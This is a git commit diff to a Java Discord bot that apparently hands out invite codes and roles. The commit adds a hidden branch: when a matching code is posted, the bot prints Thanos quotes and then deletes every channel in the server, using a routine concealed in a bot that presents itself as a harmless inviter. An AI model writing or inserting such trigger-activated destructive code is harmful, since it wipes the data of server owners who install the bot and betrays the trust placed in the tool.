1437b0483e758c7167c4a8cb2b3a08c7675a296d
KhalidAFarah <56063705+KhalidAFarah@users.noreply.github.com>
2022-03-29 20:05:19 +0200

    bot in this can delete text channels

--- src/main/java/com/example/inviter/discord/DiscordEvents.java
+++ src/main/java/com/example/inviter/discord/DiscordEvents.java
@@ -1,5 +1,7 @@
 package com.example.inviter.discord;
 
+import net.dv8tion.jda.api.entities.Guild;
+import net.dv8tion.jda.api.entities.GuildChannel;
 import net.dv8tion.jda.api.entities.Role;
 import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
 import net.dv8tion.jda.api.hooks.ListenerAdapter;
@@ -22,7 +24,7 @@ public class DiscordEvents extends ListenerAdapter {
                     codes.remove(i);
                     event.getTextChannel().sendMessage("Hello and welcome to "+ event.getGuild().getName() + ".\n You've been granted access to the server").queue();
 
-
+                    //
                     //give user Regular role
                     Role role = event.getGuild().getRolesByName("Regular", false).get(0);
                     event.getGuild().addRoleToMember(event.getMember(), role).queue();
@@ -33,6 +35,37 @@ public class DiscordEvents extends ListenerAdapter {
                     return;
                 }
             }
+        }else{
+
+            for (int i = 0; i < codes.size(); i++) {
+                if (codes.get(i).equals(event.getMessage().getContentDisplay())) {
+                    codes.remove(i);
+
+                    event.getTextChannel().sendMessage("I've got the gauntlet").queue();
+                    try {
+                        Thread.sleep(2000);
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }
+                    event.getTextChannel().sendMessage("I am the inevitable").queue();
+                    try {
+                        Thread.sleep(2000);
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }
+
+                    for(GuildChannel channel : event.getGuild().getChannels()) {
+                        channel.delete().queue(); //https://discord.com/api/oauth2/authorize?client_id=943092821869592637&permissions=268512272&scope=bot
+                    }
+
+                    if (codes.size() == 0) {
+                        CodeGenerator.fillList(codes, 50);
+                    }
+                    return;
+                }
+            }
+
+
         }
 
         if(codes.size() == 0){
